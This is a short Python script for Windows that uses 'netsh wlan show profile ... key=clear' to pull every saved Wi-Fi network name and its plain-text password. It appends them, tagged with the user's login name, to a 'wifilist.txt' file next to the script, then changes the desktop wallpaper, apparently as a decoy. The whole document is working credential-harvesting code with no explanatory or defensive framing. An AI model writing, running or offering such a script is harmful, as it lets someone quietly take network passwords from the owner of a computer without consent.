import ctypes
import os.path
import subprocess
import re
import sys
from pathlib import Path
import os


process = subprocess.run(["netsh", "wlan", "show", "profiles"], capture_output = True).stdout.decode('unicode_escape')

profile_names = re.findall("All User Profile     : (.*)\r", process)


wifi_list = list()

if(len(profile_names) != 0):
    for name in profile_names:
        wifi_profile = dict()

        profile_info = subprocess.run(["netsh", "wlan", "show", "profile", name], capture_output = True).stdout.decode('unicode_escape')

        if re.search("Security key           : Absent", profile_info):
            continue

        else:
            wifi_profile["ssid"] = name

            profile_info_pass = subprocess.run(["netsh", "wlan", "show", "profile", name, "key=clear"], capture_output = True).stdout.decode('unicode_escape')

            password = re.search("Key Content            : (.*)\r", profile_info_pass)

            if password == None:
                wifi_profile["password"] = None

            else:
                wifi_profile["password"] = password[1]

            wifi_list.append(wifi_profile)


path_to_list = os.path.dirname(os.path.realpath(__file__))+"\\"+"wifilist.txt"


with open(path_to_list, 'a+') as fh:
     fh.write("\n\n-----------------------------"+str(os.getlogin())+"------------------------------------------------------\n\n")
     for x in wifi_list:
        
        fh.write(f"SSID: {x['ssid']}\nPassword: {x['password']}\n")

dir_path = os.path.dirname(os.path.realpath(__file__))+"\\"+"wall.jpg"

ctypes.windll.user32.SystemParametersInfoW(20,0,dir_path, 0)